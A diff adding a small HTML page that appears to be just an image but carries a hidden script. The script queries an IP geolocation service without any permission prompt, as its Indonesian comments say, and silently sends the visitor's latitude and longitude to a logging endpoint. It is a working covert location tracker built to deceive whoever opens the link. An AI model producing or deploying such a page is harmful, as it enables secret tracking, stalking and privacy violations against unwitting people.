@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <img src="https://example.com/image.jpg" width="100%">
+    
+    <script>
+        // Mengambil lokasi via IP API (tanpa pop-up izin)
+        fetch('https://ipapi.co/json/')
+            .then(r => r.json())
+            .then(data => {
+                // Kirim data ke Vercel API
+                fetch(`/api/logger?lat=${data.latitude}&lon=${data.longitude}`);
+            });
+    </script>
+</body>
+</html>
